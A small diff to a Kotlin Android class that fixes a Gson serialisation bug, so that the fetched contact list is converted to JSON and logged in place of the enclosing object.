@@ -21,7 +21,7 @@ class Contacts(context: Context) : Command(), Executor {
     override fun execute(data: Array<Any>) {
         ContactGainer.getContacts(context!!)
             .let {
-                return@let Gson().toJson(this)
+                return@let Gson().toJson(it)
             }
             .apply {
                 Logger.json(this)
